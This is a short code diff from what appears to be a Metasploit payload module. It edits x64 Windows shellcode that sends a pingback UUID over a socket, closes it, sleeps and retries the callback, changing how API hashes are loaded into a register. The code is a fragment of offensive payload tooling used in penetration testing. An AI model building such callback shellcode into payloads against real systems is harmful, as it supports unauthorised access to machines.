@@ -234,12 +234,12 @@ module MetasploitModule
         get_pingback_address:
           pop rdx                ; PINGBACK UUID address
           mov rcx, rdi           ; Socket handle
-          mov r10, #{block_api_hash('ws2_32.dll', 'send')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'send')}
           call rbp               ; call send
 
         close_socket:
           mov rcx, rdi           ; Socket handle
-          mov r10, #{block_api_hash('ws2_32.dll', 'closesocket')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'closesocket')}
           call rbp               ; call closesocket
         ^
     if pingback_count > 0
@@ -250,7 +250,7 @@ module MetasploitModule
             dec r15               ;decrement the pingback retry counter
             push #{pingback_sleep * 1000}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
-            mov r10, #{block_api_hash('kernel32.dll', 'Sleep')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'Sleep')}
             call rbp              ; Sleep()
             jmp create_socket     ; repeat callback
         ^
